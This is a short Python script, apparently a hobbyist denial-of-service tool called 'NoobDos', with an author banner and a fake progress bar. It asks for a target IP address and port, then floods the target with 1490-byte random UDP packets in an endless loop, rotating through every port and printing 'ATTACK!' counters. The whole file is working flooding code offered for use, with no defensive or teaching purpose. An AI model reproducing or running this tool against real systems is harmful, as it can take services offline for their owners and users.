import os
import time
import socket
import random
from datetime import datetime

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = os.urandom(1490)

color = [
    31,
    33,
    32,
    36,
    34,
    35
]

os.system("clear")
try:
    os.system('figlet NoobDos')
except:
    print("NoobDos!")
print("\nAuthor   : DejaVolf x 0xF54A1")
print("Group    : Luna Space")
print("Version  : 1.0\n")

ip = input("IP Address : ")
port = int(input("Port       : "))

os.system("clear")
try:
    os.system('figlet NoobDos Starting')
except:
    print("NoobDos Staring...")

for i in range(0, 101, 25):
    print(f"[{'=' * (i // 5):<20}] {i}%")
    time.sleep(2)

def rainbow_text(text):
    result = ""
    for i, char in enumerate(text):
        color_code = color[i % len(color)]
        result += f"\033[1;{color_code}m{char}\033[0m"
    return result

# Sending loop
sent = 0
try:
    while True:
        sock.sendto(payload, (ip, port))
        sent += 1
        port = port + 1 if port < 65534 else 1
        if sent % 100 == 0:
            message = f"ATTACK! {sent} packets to {ip} through port:{port}"
            print(rainbow_text(message))

except KeyboardInterrupt:
    print("\n\n[!] Stopped by user.")
